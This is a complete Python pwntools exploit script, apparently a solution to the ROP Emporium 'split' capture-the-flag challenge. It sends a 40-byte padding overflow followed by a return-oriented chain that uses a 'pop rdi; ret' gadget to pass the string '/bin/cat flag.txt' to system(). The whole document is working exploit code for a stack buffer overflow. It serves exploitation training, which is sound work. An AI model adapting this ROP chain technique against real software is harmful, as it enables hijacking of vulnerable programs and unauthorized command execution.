from pwn import *

p = process('./split')
e = ELF('./split')
r = ROP(e)

cat_flag = next(e.search(b'/bin/cat flag.txt\x00'))
system = e.sym['system']
pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]

pad = b'A'*40
chain = p64(pop_rdi)
chain += p64(cat_flag)
chain += p64(system)

p.sendline(pad+chain)
p.interactive()

